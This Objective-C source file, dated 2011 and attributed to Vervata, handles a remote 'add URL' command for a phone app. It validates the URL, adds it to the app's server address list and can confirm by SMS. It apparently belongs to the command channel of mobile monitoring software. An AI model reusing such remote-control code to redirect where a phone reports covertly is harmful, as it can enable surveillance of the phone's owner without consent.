/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddURLProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddURLProcessor.h"
#import "ServerAddressManager.h"

@interface AddURLProcessor (PrivateAPI)
- (BOOL) canAddURL;
- (BOOL) checkIfURLAlreadyExist;

- (void) sendReplySMS;
- (void) processAddURL;
- (void) addURLException: (NSUInteger) aErrorCode;
@end

@implementation AddURLProcessor

@synthesize URLs;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddURLProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddURLProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddURLProcessor--->doProcessingCommand")
 	[self setURLs:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kURLValidation]];
	DLog(@"AddURLProcessor--->URLs:%@",URLs);
	
	if ([URLs count]>0) {
		if ([self canAddURL]) { 
			if (![self checkIfURLAlreadyExist] &&
				![RemoteCmdProcessorUtils isDuplicateString:URLs])  [self processAddURL];
			else [self addURLException:kCmdExceptionErrorCannotAddDuplicateToUrlList];
		}
		else {
			[self addURLException:kCmdExceptionErrorUrlExceedListCapacity];
		}
	}
	else {
		[self addURLException:kCmdExceptionErrorInvalidUrlToUrlList];
	}
}


#pragma mark AddURLProcessor Private Methods

/**
 - Method name: processAddURL
 - Purpose:This method is used to add url to list
 - Argument list and description: No argument
 - Return description: No return type
 */

- (void) processAddURL {
	DLog (@"AddURLProcessor--->processAddURL")
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	[serverManager addUserURLs:URLs];
	[self sendReplySMS];
}

/**
 - Method name: canAddURL
 - Purpose:This method is to check maximum URL list capacity. 
 - Argument list and description: No argument
 - Return description:BOOL
 */

- (BOOL) canAddURL {
	DLog (@"AddURLProcessor--->canAddURL");
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	NSArray *userURLs = [serverManager userURLs];
	NSUInteger count=[userURLs count]+[URLs count];
	if (count<=1) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfURLAlreadyExist
 - Purpose:This method is used to check if url already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) checkIfURLAlreadyExist {
	BOOL isUrlExist=NO;
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	NSArray *userURLs = [serverManager userURLs];
	for (NSString *url in URLs) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",url];
		NSArray *result=[userURLs filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isUrlExist=YES;
			break;
		}
	}
	return isUrlExist;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No argument
 - Return description: No return type
**/

- (void) sendReplySMS {
	DLog (@"AddURLProcessor--->sendReplySMS")
	NSString *addURLmessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																			    	  andErrorCode:_SUCCESS_];
	 [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:addURLmessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:addURLmessage];
	}
}

/**
 - Method name: addURLException
 - Purpose:This method is invoked when AddURL Process failed. 
 - Argument list and description: NSUInteger aErrorCode
 - Return description: No Argument
 */

- (void) addURLException: (NSUInteger) aErrorCode {
	DLog (@"addURLException--->sendReplySMS")
	FxException* exception = [FxException exceptionWithName:@"processAddURL" andReason:@"Add URL error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[URLs release];
	[super dealloc];
}

@end